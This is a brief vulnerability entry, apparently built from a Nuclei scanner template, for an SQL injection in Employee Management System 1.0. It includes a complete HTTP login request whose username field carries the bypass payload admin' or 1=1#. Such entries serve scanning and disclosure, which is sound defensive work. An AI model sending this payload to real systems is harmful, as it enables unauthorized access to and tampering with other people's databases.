# Vulnerability: Employee Management System 1.0 - SQL Injection
**Classification:** CWE-89
**Source:** Nuclei Template (`ems-sqli.yaml`)

## Description
Employee Management System 1.0 contains a SQL injection vulnerability via the username parameter.  An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /process/aprocess.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

mailuid=admin' or 1=1#&pwd={{rand_base(5)}}&login-submit=Login
```

